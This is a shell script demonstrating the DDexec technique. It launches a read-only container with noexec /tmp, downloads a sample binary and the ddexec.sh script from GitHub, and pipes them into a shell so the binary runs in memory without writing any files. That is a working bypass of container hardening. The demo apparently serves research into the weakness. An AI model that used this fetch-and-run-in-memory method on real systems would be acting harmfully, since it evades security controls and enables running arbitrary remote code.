#!/bin/sh

# based on https://github.com/arget13/DDexec

e() { echo -en "\x1b[0;33m$1: ";echo -en "\x1b[1;33m"; }
ee() { test -z "$1" && args='-en' || args='-e';echo $args "$1\x1b[0m"; }

ARCH=$(uname -m | xargs echo -n | tr -c 'A-Za-z0-9' '_' | tr 'A-Z' 'a-z')

DD_URL=https://raw.githubusercontent.com/arget13/DDexec/main/ddexec.sh
FAKE_URL=https://github.com/gonoph/ddexec_example/files/13326942/fake.$ARCH.gz

cleanup() {
	set +e
	e "killing pod"
	$CONTAINER stop -t 1 test
	ee ""
}

GET() {
	[[ "$1" == *"/curl" ]] && echo "$1 -Ls $2 -o $3" && return 0
	[[ "$1" == *"/wget" ]] && echo "$1 -q $2 -O $3" && return 0
	echo "Unknown web command: $1" 1>&2 && exit -1
}

e "Checking for podman or docker"
test -x /usr/bin/docker && CONTAINER=docker
test -x /usr/bin/podman && CONTAINER=podman
test -z "$CONTAINER" && echo "Need a container runtime: podman or docker not found" 1>&2 && exit -1
ee $CONTAINER

# default image UBI or alpine
: ${IMAGE:=ubi9}
ID=""
test -d /etc/os-release && source /etc/os-release
test "$ID" == "fedora" && IMAGE=ubi9
test "$ID" == "alpine" && IMAGE=alpine
test "$ID" == "ubuntu" && IMAGE=alpine

set -e
e "Starting READ-ONLY container with /tmp NOEXEC"
$CONTAINER run --rm --name=test -d --read-only $IMAGE sleep 3600
ee ""

trap cleanup EXIT

e "Testing for curl or wget..."
WEB=$($CONTAINER exec test sh -c "(which curl;which wget) 2>/dev/null | head -n 1")
ee $WEB

GET "$WEB" "test" "test" > /dev/null

FAKE=$(GET $WEB $FAKE_URL -)
DDEXEC=$(GET $WEB $DD_URL -)

e "execute using ddexec without writing any files"
echo
$CONTAINER exec test sh -c "$FAKE | gzip -cd | base64 -w0 | sh <($DDEXEC) fake"
ee ""
